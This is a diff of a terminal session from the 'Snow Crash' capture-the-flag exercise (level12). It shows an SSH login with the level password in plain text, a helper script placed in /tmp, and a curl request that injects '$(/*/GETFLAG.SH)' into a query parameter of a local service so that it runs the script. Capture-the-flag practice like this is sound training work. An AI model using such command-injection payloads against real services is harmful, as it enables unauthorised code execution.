@@ -1,11 +1,11 @@
 ┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level12
 level12@192.168.1.64's password: fa6v5ateaw21peobuub8ipe6s
-level12@SnowCrash:~$ cat << EOF > /tmp/GETFLAG.SH
-> #!/bin/bash
->
-> /bin/getflag > /tmp/flag12
-> EOF
+level12@SnowCrash:~$ vi /tmp/GETFLAG.SH
+#!/bin/bash
+
+/bin/getflag > /tmp/flag12
+EOF
 level12@SnowCrash:~$ chmod +x /tmp/GETFLAG.SH
 level12@SnowCrash:~$ curl  'http://127.0.0.1:4646/?x=$(/*/GETFLAG.SH)'
 ..level12@SnowCrash:~$ cat /tmp/flag12
